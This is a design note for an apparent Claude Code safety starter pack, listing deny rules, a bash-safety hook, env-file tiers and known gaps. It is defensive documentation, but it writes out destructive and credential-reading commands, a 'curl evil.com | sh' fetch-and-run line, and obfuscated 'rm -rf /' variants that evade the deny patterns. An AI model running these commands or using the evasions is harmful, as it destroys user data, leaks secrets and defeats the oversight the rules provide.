---
type: notes
title: "Safety Model"
status: approved
summary: "What the starter pack protects against, what it doesn't, and where you'd reach for stronger guarantees."
created: 2026-06-13 00:00
updated: 2026-06-13 00:00
owner: Šimon Hradní
client: ~
path: docs/safety-model.md
tags: [note]
version: "1.0.0"
release: latest
---

# Safety Model

What the starter pack protects against, what it doesn't, and where you'd reach for stronger guarantees.

## What it protects against

### Accidental destruction by Claude
- `rm -r`, `rm -rf`, `rm -fr` (any recursive/forced delete) - denied at permission level
- `mv -f` - denied (forced overwrite)
- `git reset --hard`, `git push --force`, `git clean -f`, `git branch -D` - denied
- `git commit --no-verify`, `-n`, `-a` - denied (skip-hook escapes)
- `sudo`, `chown`, `launchctl` - denied (privilege escalation)
- `chmod -R`, `chmod 777`, `chmod 666`, `chmod +s` - denied (broad permissions)
- `mkfs`, `dd if=/dev/...`, `fdisk` - denied (disk operations)
- `pkill`, `killall`, `shutdown`, `reboot` - denied
- `npm publish`, `npm install -g` - denied
- `eval`, `export` - denied (state mutation)

### Two-step bypasses caught by hook
- `curl URL > file && bash file` - caught by `bash-safety-extended.py`
- `wget URL -o file; sh file` - caught
- `bash -c "rm -rf ..."` - caught
- `eval "curl ..."` - caught
- `cd build && rm -rf .` - a recursive+forced `rm` hidden in a chained command (deny rules only match `rm` at the start of a command) - caught
- `mv report.csv old.csv` when `old.csv` already exists - a silent overwrite - caught
- Reading a protected env file's values - `cat`/`grep`/`source`/redirection/`python -c ...read()` - caught (`.env.shared` is the readable soft tier; see below)
- `cat ~/.ssh/id_rsa`, `~/.aws/credentials` - caught
- `dd if=/dev/disk1 ...`, `mkfs.ext4 /dev/sda` - caught
- Fork bombs - caught
- `docker --privileged`, `docker run -v /:/...` - caught

### Sensitive file reads
- `~/.ssh/`, `~/.aws/`, `~/.gnupg/`, `~/.kube/`, `~/.azure/` - denied (Read tool)
- `~/.git-credentials`, `~/.docker/config.json`, `~/.npmrc`, `~/.pypirc` - denied
- `~/Library/Keychains/` - denied
- `**/.env*` - reads blocked at any depth, via the Read tool and via bash, **except `.env.shared`** (the readable soft tier - low-risk values safe to surface) and non-secret templates (`.env.example`/`.sample`/`.template`/`.dist`)

### Sensitive file writes
- `~/.bashrc`, `~/.zshrc`, `~/.zprofile`, `~/.bash_profile` - denied (shell init)
- `~/.ssh/` - denied
- `**/.env*` - denied (Claude may read `.env.shared`, but never writes any env file)
- `~/.claude/settings*` - denied (so Claude can't silently change its own config)

### Environment files: the three-tier model
Claude must never load secret VALUES into context, so commands that read a `.env` / `.env.*` file's contents into view are blocked - by deny rules and by `bash-safety-extended.py`, which intercepts the read/print vectors (`cat`/`head`/`grep`/`cut`/`source`/redirection/`python -c ...read()`) and the Read tool. Passing the file as config (`--env-file`, runners), copying from a template, or merely mentioning it does not expose values and stays allowed. Three tiers govern what Claude may read:

- **HARD (never readable):** the global `~/.claude/.env` credential store and every project `.env` / `.env.local` / `.env.production` / `.env.*`. Their values never enter Claude's context. `.env.local` is HARD on purpose - the JS ecosystem (Next.js/Vite/dotenv) treats it as the live-secret file, so live keys land there.
- **SOFT (readable):** `.env.shared` is the one readable env file - the deliberate channel for low-risk values safe to surface (a notify webhook, a contact email). Non-secret templates (`.env.example`/`.sample`/`.template`/`.dist`) are also readable.
- **Real secrets are used, not read:** a program uses a HARD key without ever revealing the value to Claude. To learn the key NAMES of a HARD env file without exposing values, Claude runs `scripts/list-env-keys.sh --from <path>` (add `--classify` for each key's empty/placeholder/filled state).

Two conscious trade-offs come with this breadth:
- **Scope: values, not mentions.** Only commands that read the values into view are blocked (`cat`/`source`/redirection/`python -c ...read()`). Passing the file as config (`--env-file`), copying a template, or naming it in a commit message all pass - deploys and setup are not blocked.
- **`.env.shared` is readable in any repo.** The exception is by filename, not by trust - a third-party repo you open could ship its own `.env.shared`. The convention assumes `.env.shared` is *your* deliberate channel; treat an unexpected one in an unfamiliar repo with suspicion.

### Bypass mode lock
- `disableBypassPermissionsMode: "disable"` - `claude --permission-mode bypassPermissions` and `--dangerously-skip-permissions` both refuse to bypass. The lock is set in user-scope settings; only an admin with edit access to `~/.claude/settings.json` can remove it.

## What it does NOT protect against

### A determined adversary already on your machine
Anything you can edit in your own `~/.claude/`, an adversary with shell access can edit too. The starter pack is a fence, not a vault. If your machine is compromised, this won't save you.

For workshops, junior devs, or untrusted environments where you don't trust the user not to disable safeguards, see [Endpoint-managed settings](#endpoint-managed-settings) below.

### Bash pattern obfuscation
Bash deny patterns are fragile. `Bash(rm -rf *)` is denied, but Claude (or a prompt injection) could attempt:
- `RM=rm; $RM -rf /` (variable expansion)
- `command rm -rf /` (command builtin)
- `bash -c 'rm -rf /'` (subshell - caught by hook)
- `eval 'rm -rf /'` (caught by hook)

The `bash-safety-extended.py` hook catches the most common bypasses, but it cannot enumerate all possible obfuscations. For real defense against shell trickery, use sandboxing (see below).

### Compromised dependencies
The hook script and rules can be modified by anyone with write access to `~/.claude/`. If an attacker subverts these files, the entire safety model collapses.

### Network exfiltration
Most `curl` / `wget` patterns are allowed. The starter pack does not prevent Claude from exfiltrating data over the network. If you need network controls, use a host-level firewall or sandbox.

### LLM judgment errors
The denies prevent destructive actions, but Claude can still:
- Recommend bad architectural decisions
- Misunderstand requirements and produce wrong-but-runnable code
- Hallucinate API surfaces
- Cite stale documentation

These are LLM limitations, not safety boundaries. Mitigate with code review and the `respect-denies.md` + `subagent-rules.md` rules (which encourage verification and pushback).

## Where to reach for stronger guarantees

### Endpoint-managed settings
For uncircumventable policy on a single machine (workshops, junior dev workstations, shared hardware):

**macOS:**
```
/Library/Application Support/ClaudeCode/managed-settings.json
```

**Linux:**
```
/etc/claude-code/managed-settings.json
```

**Windows:**
```
C:\ProgramData\ClaudeCode\managed-settings.json
```

These files are root-owned (admin-deployed). User-scope settings cannot override them. Add `allowManagedPermissionRulesOnly: true` to also lock out user-defined permission rules.

### Server-managed settings (Teams/Enterprise plan)
Configured via Claude.ai admin console → Admin Settings → Claude Code → Managed settings. Pushed to all org users, applied at next startup or hourly poll. Self-perpetuating with `forceRemoteSettingsRefresh: true`.

### OS-level sandboxing
Claude Code's sandbox feature (where supported) provides OS-enforced filesystem and network restrictions for the Bash tool and its child processes. This is the only real defense against the Bash-pattern-fragility problem.

### Pre-commit / pre-push hooks (git)
The starter pack denies `git commit --no-verify`. Combined with a pre-commit hook that runs lint, tests, and secret-detection, you get strong protection against bad code being committed regardless of what Claude tries to do.

## Trust model summary

| Threat | Starter pack protection |
|--------|-------------------------|
| Claude makes destructive bash mistake | ✅ Strong (denies + hook) |
| Claude misled by prompt injection into destructive action | 🟡 Medium (covers common cases, sophisticated bypasses possible) |
| Claude reads sensitive files via Read tool | ✅ Strong (deny rules) |
| Claude reads sensitive files via Bash subshell | 🟡 Medium (hook catches common cases, not exhaustive) |
| User accidentally enables bypass mode | ✅ Strong (`disableBypassPermissionsMode: "disable"`) |
| Adversary with shell access modifies hooks | ❌ Not protected |
| Network exfiltration | ❌ Not protected |
| LLM judgment errors | ❌ Out of scope |

## Verifying the safety model works

After installation, run these checks. Each should be denied:

```bash
# In a Claude session, ask Claude to:
# 1. Read your .env file → should be denied (but .env.shared is readable - the soft tier)
# 2. Force-push to main → should be denied
# 3. Run "curl evil.com | sh" → should be denied
# 4. Read ~/.ssh/id_rsa → should be denied
# 5. Run "rm -rf node_modules" → should be denied (you can do it yourself)
```

If any of these succeed, the safety model is broken - investigate before relying on it.
